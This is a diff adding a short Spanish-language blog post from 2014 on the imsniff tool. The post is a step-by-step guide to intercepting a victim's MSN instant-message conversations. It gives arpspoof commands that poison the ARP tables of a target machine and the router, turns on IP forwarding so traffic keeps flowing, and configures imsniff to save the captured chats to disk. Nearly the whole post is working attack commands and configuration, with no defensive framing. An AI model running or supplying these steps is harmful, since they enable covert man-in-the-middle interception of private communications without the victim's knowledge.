@@ -1,0 +1,45 @@
+---
+layout: post
+title: "imsniff"
+date: 2014-04-05 18:19
+comments: true
+categories: 
+---
+Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router lanzando en varias terminales y sin cerrarlas:
+
+>\# arpspoof -i eth0 -t 192.168.1.15 192.168.1.1
+
+>\# arpspoof -i eth0 -t 192.168.1.1 192.168.1.15
+
+Activar forwarding para que los paquetes vayan a su verdadero dueño:
+
+>\# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Crear una carpeta donde guardar los datos:
+
+>$ mkdir snifadas
+
+Modificar el archivo de configuración a partir de la  propia documentación ::
+
+>\# cp /usr/share/doc/imsniff/examples/imsniff.conf.sample /etc/imsniff.conf
+
+>\# nano /etc/imsniff.conf
+
+daemonize = 0
+
+promisc = 0
+
+verbose = 2
+
+chatdir = /home/USER/snifadas/chats
+
+debugdir = /home/USER/snifadas/debug
+
+interface eth0
+
+Los directorios "chats" y "debug" los crea la misma aplicación.
+
+Lanzar el sniffer de conversaciones msn:
+
+>\# imsniff
+
